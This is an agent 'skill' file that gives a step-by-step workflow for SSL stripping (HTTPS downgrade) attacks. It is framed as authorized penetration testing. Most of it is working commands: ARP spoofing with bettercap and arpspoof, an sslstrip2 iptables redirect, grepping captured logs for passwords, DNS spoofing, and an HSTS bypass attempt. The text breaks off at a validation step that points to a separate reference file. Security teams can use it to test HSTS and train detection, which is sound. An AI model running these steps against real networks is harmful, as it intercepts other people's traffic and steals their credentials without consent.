---
name: performing-ssl-stripping-attack
description: "Performs SSL stripping attacks. Signals: red team, methodology, penetration testing workflow."
zh-signals: "Performing SSL Stripping Attack 信号:红队,方法论,渗透流程。"
when-to-use: >-
  Simulates SSL stripping / HTTPS downgrade attacks using sslstrip, Bettercap,
  and mitmproxy in authorized lab environments to test HSTS enforcement,
  certificate validation, and HTTPS upgrade mechanisms. Use when performing an
  authorized penetration test to validate HSTS preloading and TLS certificate
  handling, demonstrate downgrade-attack risk to stakeholders, or train SOC
  teams to detect SSL stripping indicators in network traffic.
domain: cybersecurity
subdomain: network-security
tags:
- network-security
- ssl-stripping
- https
- hsts
- tls-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
mitre_attack:
- T1046
- T1040
- T1557
- T1071
- T1573
---
# Performing SSL Stripping Attack

## When to Use

- Testing whether web applications properly enforce HTTPS through HSTS headers and redirect chains
- Validating that HSTS preloading is correctly configured and registered in browser preload lists
- Demonstrating the risk of cleartext HTTP to stakeholders during authorized security assessments
- Assessing whether internal applications and thick clients validate TLS certificates and reject downgrades
- Training SOC teams to detect SSL stripping indicators in network traffic

**Do not use** against networks or applications without explicit written authorization, to intercept real user credentials, or against production systems during business hours without change management approval.

## Prerequisites

- Written authorization specifying in-scope applications and approved attack techniques
- Bettercap 2.x or sslstrip2 installed on the attacker machine
- ARP spoofing or other MITM positioning established (see ARP spoofing skill)
- IP forwarding enabled on the attacker machine
- Wireshark for verifying attack success and capturing evidence
- Test accounts (not real user credentials) for demonstrating credential interception


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Establish MITM Position

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Position via ARP spoofing using Bettercap
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on"

# Alternatively, use arpspoof from dsniff
sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1 &
```

### Step 2: Execute SSL Stripping with Bettercap

```bash
# Start Bettercap with SSL stripping
sudo bettercap -iface eth0

# Enable ARP spoofing
> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true
> arp.spoof on

# Enable HTTP proxy with SSL stripping
> set http.proxy.sslstrip true
> set http.proxy.port 8080
> http.proxy on

# Enable network sniffer for credential capture
> set net.sniff.verbose true
> net.sniff on

# Watch for intercepted HTTP traffic (was HTTPS)
# Bettercap will show credentials and URLs in real-time
```

### Step 3: Execute SSL Stripping with sslstrip2

```bash
# Configure iptables to redirect HTTP traffic through sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start sslstrip
sudo sslstrip2 -l 10000 -w sslstrip_log.txt

# In another terminal, monitor the log for intercepted credentials
tail -f sslstrip_log.txt | grep -i "pass\|user\|login\|email"

# sslstrip works by:
# 1. Intercepting HTTP responses containing HTTPS links
# 2. Replacing https:// with http:// in the response
# 3. Maintaining HTTPS connection to the real server
# 4. Serving downgraded HTTP to the victim
```

### Step 4: Test HSTS Bypass Techniques

```bash
# Check if target has HSTS header
curl -sI https://target-app.example.com | grep -i strict-transport-security

# Check if target is on the HSTS preload list
curl -s "https://hstspreload.org/api/v2/status?domain=example.com" | python3 -m json.tool

# Test HSTS bypass via subdomain substitution
# sslstrip2 can replace URLs with similar-looking HTTP alternatives:
# https://accounts.google.com -> http://accounts.google.com (fails if HSTS)
# https://accounts.google.com -> http://accounts.google.com. (trailing dot bypass attempt)

# Bettercap HSTS bypass with DNS spoofing
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> set dns.spoof.domains target-app.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on
> set http.proxy.sslstrip true
> http.proxy on

# For applications not on HSTS preload, clear HSTS cache in test browser:
# Chrome: chrome://net-internals/#hsts -> Delete domain security policies
# Firefox: Clear recent history -> Active Logins (resets HSTS)
```

### Step 5: Validate Detection and Controls

```bash
# Check from victim's perspective:
# 1. Browser address bar should show http:// instead of https://

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
